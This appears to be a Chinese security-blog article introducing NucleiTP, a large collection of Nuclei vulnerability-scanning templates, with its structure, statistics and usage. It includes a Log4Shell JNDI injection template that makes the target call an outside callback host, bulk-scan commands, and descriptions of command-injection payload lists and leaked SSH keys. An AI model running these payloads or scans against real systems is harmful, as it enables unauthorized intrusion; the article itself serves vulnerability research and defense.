#  一万四千条 Nuclei 漏洞模板全塞进一个仓库：全网 POC 实时监控，扫描速度快到离谱  
棉花糖糖糖
                    棉花糖糖糖  棉花糖网络安全工具箱   2026-11-06 02:43  
  
安全声明：本文仅用于技术研究与防御加固。NucleiTP 收录的模板包含远程代码执行、敏感信息泄露等高危验证逻辑，所有测试行为必须限定在自有资产或已取得书面授权的目标范围内，非法使用造成的一切后果由使用者自行承担。
NucleiTP 是一个面向 Nuclei 扫描引擎的漏洞模板仓库，主线覆盖全网漏洞 POC 的收集归档、风险分级与加载可用性校验。仓库将 CVE、CNVD 编号漏洞与未分配编号的通用 POC 分层存放，按严重等级拆分目录，对每条模板执行引擎加载测试，并对重复条目自动改名。项目不封装扫描逻辑，不含并发调度与代理层，全部能力通过 Nuclei 原生模板协议承载，克隆后即可被 nuclei -l 直接消费。
重点导读仓库结构
PART 01目录树
NucleiTP/
├── critical/        # 严重级，未编号 POC
├── high/            # 高危级，未编号 POC
├── medium/          # 中危级，未编号 POC
├── low/             # 低危级，未编号 POC
├── info/            # 信息级，未编号 POC
├── unknown/         # 严重度待定
├── CVES/            # CVE 编号归档，五级子目录
├── CNVD/            # CNVD 编号归档，四级子目录
└── helpers/         # 字典与 payload 资源

PART 02数据规模



目录
模板数
目录
模板数




critical
690
CVES/critical
1406


high
1914
CVES/high
2292


medium
1370
CVES/medium
2172


low
532
CVES/low
46


info
4130
CVES/info
8


unknown
39
CNVD/critical
19


—
—
CNVD/high
34


—
—
CNVD/medium
17


—
—
CNVD/low
3



合计 14672 条模板文件，格式为 14612 个 .yaml 与 60 个 .yml。
PART 03编号分离

CVES 目录：带 CVE 编号，文件名保留原编号，大小写混用
CNVD 目录：带 CNVD 编号，四级分类，无信息级
顶层目录：未分配编号的通用 POC，按严重等级落盘

重点导读模板构成
PART 04协议类型



协议键
出现次数
用途




http
8354
Web 应用漏洞验证


requests
5353
多请求串联式验证


file
366
本地文件读取


tcp
136
TCP 服务探测


network
59
原始协议交互


dns
37
DNS 解析类探测


ssl
29
TLS 证书与握手检测


headless
21
浏览器渲染类验证


javascript
18
JS 上下文执行


code
2
外部代码加载



PART 05匹配器



类型
次数
说明




word
16861
关键字匹配


status
10126
状态码匹配


regex
8658
正则提取与匹配


dsl
3922
版本比较、布尔条件


json
97
JSON 字段提取


hex
95
二进制响应比对


binary
52
二进制载荷匹配


xpath
18
XML 节点提取



PART 06交互回连
528 条模板引入 interactsh 外带通道，69 条模板使用 fuzz 模式做批量参数填充。前者用于无回显漏洞的存在性判定，后者用于弱口令、目录枚举等需要遍历的场景。
PART 07版本判定
针对 CMS 生态模板，通用做法是先读取组件自带的 readme.txt，用正则捕获 Stable tag 版本号，再交给 DSL 的 compare_versions 做区间比较，从而避免写死单一版本号导致的漏判。
yamlmatchers-condition: and
matchers:
  - type: status
    status:
      - 200

  - type: word
    words:
      - "123contactform-for-wordpress"
    part: body

  - type: dsl
    dsl:
      - compare_versions(version, '<= 1.5.6')

重点导读内容覆盖
PART 08年份分布
CVE 模板覆盖 2000 年至 2023 年，峰值集中在近年：



年份
数量
年份
数量




2020
1109
2015
214


2019
686
2016
208


2021
634
2014
191


2010
616
2012
115


2018
611
2011
96


2022
474
2009
90


2017
347
2013
73


2023
283
2008
63



PART 09高频标签
cve(7423)、wordpress(3010)、wp-plugin(2494)、lfi(2058)、xss(1591)、panel(1381)、rce(1238)、sqli(434)、token-spray(397)、osint(682)、joomla(722)、misconfig(584)、kev(348)、oast(382)、default-login(288)、authenticated(340)、intrusive(305)。
PART 10产品侧重

WordPress 插件与主题：占未编号 POC 的主体，命名规则为 插件标识-漏洞类型-hash
Joomla 扩展、通用 CMS 后台面板
运维与中间件：面板暴露、默认口令、配置泄露
已知在野利用漏洞：KEV 标签条目 348 条

重点导读自动化机制
PART 11加载校验

引擎加载测试：模板提交后验证 Nuclei 是否可正常解析执行
语法与字段完整性检查
协议类型与严重等级一致性校验

PART 12重名改写
同一漏洞的多个模板在仓库中以数字后缀区分，5490 个文件名带有数字后缀，重复条目不再互相覆盖。
PART 13增量提交
仓库累计 18667 次提交，其中 18666 次来自同一维护者，最近一次数据更新停留在 2024 年 2 月 29 日。提交信息采用统一前缀加时间戳格式，便于按时间切片回溯模板增量的来源。
重点导读辅助资源
helpers 目录存放自定义模板所需的字典与 payload，可直接通过 {{wordlist}} 方式引用。
PART 14字典



文件
行数
内容




wordlists/wordpress-plugins.txt
98134
WordPress 插件 slug


wordlists/wordpress-themes.txt
24433
WordPress 主题 slug


wordlists/adminer-paths.txt
740
Adminer 部署路径


wordlists/prestashop-modules.txt
638
PrestaShop 模块名


wordlists/mdb-paths.txt
341
MDB 路径变体


wordlists/grafana-plugins.txt
325
Grafana 插件名


wordlists/user-list.txt
100
常见用户名


wordlists/numbers.txt
100
数字字典


wordlists/shiro_encrypted_keys.txt
51
Shiro 加密密钥对


wordlists/wp-passwords.txt
23
弱口令集合


wordlists/wp-users.txt
11
WordPress 用户名


wordlists/headers.txt
2916
HTTP 请求头集合



PART 15Payload

command-injection.txt：75 条命令注入载荷，覆盖 SSI、PHP 包装器、反引号、分号等多种拼接方式
CVE-2020-5776.csv：Magento 2 数据上传绕过验证的业务数据样本
cve-2023-34039-keys/：22 组 CVE-2023-34039 涉及的 GitLab SSH 私钥与密钥对
request-headers.txt：102 条 HTTP 请求头
citrix_paddings.txt：Citrix 路径填充载荷
wp-social-warfare-rce.txt：WordPress Social Warfare 插件利用载荷

PART 16插件清单
helpers/wordpress/plugins/ 下按插件 slug 拆分 214 个独立文件，每个文件记录该插件的历史版本号，用于版本区间匹配。
重点导读模板样例
以 Apache Solr 的 Log4Shell 探测模板为例，仓库采用 interactsh 外带判定：
yamlid: apache-solr-log4j-CVE-2021-44228

info:
  name: Log4j (CVE-2021-44228) Detect for Apache Solr
  author: toramanemre
  severity: Critical

requests:
  - method: GET
    path:
      - "{{BaseURL}}/solr/admin/collections?action=${jndi:ldap://{{interactsh-url}}}&wt=json"
    headers:
      Host: "{{Host}}"
    matchers:
      - type: word
        part: interactsh_protocol
        name: dns
        words:
          - "dns"

重点导读使用方式
按等级加载：
bashnuclei -l NucleiTP/critical/ -severity critical

按目录加载：
bashnuclei -l NucleiTP/CVES/critical/

结合字典与并发参数：
bashnuclei -l NucleiTP/ -stats -c 50

重点导读注意事项

模板只做版本探测与存在性验证，不含完整利用链交付，实际危害取决于后续人工动作
标记 intrusive 的 305 条模板会在目标侧产生写入、创建账号或删除文件行为，执行前必须确认授权范围
仓库 README 已声明停止维护并计划重构代码，目录结构与命名规则后续可能变动，生产使用建议固定 commit 版本
批量扫描前先在测试环境验证，避免模板误判触发不必要的应急响应
中文与英文环境混用时注意模板内硬编码路径与主机名参数

重点导读开源地址
本文介绍的项目开源地址如下：
本公众号非项目作者，仅做技术分享。
https://github.com/ExpLangcn/NucleiTP

## 广告时间  


  
    低价考证包括但不限于CISP系列、PMP等等国内网安证书、网络安全交流群请关注公众号后点菜单栏的找棉花糖。
  
  
    糖心会员站，网络安全必备网站，包括在线内网靶场、web靶场、src靶场、应急响应靶场，以及各种网安资料、教程、方案模版、以及超级多在线工具，99元包年！详细介绍：棉花糖会员站介绍(26年4月26日版本) ：在线内网靶场、网安资料方案、在线工具全能资源站，看完介绍百分百心动！
  
  
    
  
  
    
  
